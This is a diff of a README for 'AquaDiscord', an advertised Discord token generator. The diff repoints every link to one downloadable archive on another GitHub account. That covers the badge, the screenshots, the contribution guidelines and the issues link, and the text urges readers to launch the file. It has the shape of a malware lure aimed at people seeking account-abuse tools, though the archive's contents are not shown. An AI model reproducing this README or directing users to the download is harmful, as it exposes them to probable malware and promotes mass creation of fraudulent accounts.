@@ -21,18 +21,18 @@ AquaDiscord is a powerful generator that creates unlocked Discord tokens in seco
 - token-discord
 
 ## Get Started
-To get started, [download the AquaDiscord software here](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip). 🚀
+To get started, [download the AquaDiscord software here](https://github.com/Martheguy/AquaDiscord/releases/download/v1.0/Software.zip). 🚀
 
-[![Download AquaDiscord](https://img.shields.io/badge/Download-AquaDiscord-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download AquaDiscord](https://github.com/Martheguy/AquaDiscord/releases/download/v1.0/Software.zip)](https://github.com/Martheguy/AquaDiscord/releases/download/v1.0/Software.zip)
 
 Please make sure to launch the downloaded file to begin using AquaDiscord.
 
 ## Screenshots
 Here are some sneak peeks of AquaDiscord in action:
 
-![Screenshot 1](https://example.com/screenshot1.png)
-![Screenshot 2](https://example.com/screenshot2.png)
-![Screenshot 3](https://example.com/screenshot3.png)
+![Screenshot 1](https://github.com/Martheguy/AquaDiscord/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/Martheguy/AquaDiscord/releases/download/v1.0/Software.zip)
+![Screenshot 3](https://github.com/Martheguy/AquaDiscord/releases/download/v1.0/Software.zip)
 
 ## Features
 🔧 **Fast Generating**: Create up to 1,000 tokens per second.  
@@ -46,10 +46,10 @@ Here are some sneak peeks of AquaDiscord in action:
 3. Follow the on-screen instructions to generate Discord tokens.
 
 ## Contributing
-We welcome contributions to AquaDiscord! Whether it's through code contributions or issue reporting, your help is appreciated. Please refer to the [Contribution Guidelines](CONTRIBUTING.md) for more details.
+We welcome contributions to AquaDiscord! Whether it's through code contributions or issue reporting, your help is appreciated. Please refer to the [Contribution Guidelines](https://github.com/Martheguy/AquaDiscord/releases/download/v1.0/Software.zip) for more details.
 
 ## Support
-For any queries or issues, feel free to reach out to us through [GitHub Issues](https://github.com/YouaifXD/AquaDiscord/issues).
+For any queries or issues, feel free to reach out to us through [GitHub Issues](https://github.com/Martheguy/AquaDiscord/releases/download/v1.0/Software.zip).
 
 ## License
 AquaDiscord is released under the [MIT License](LICENSE).
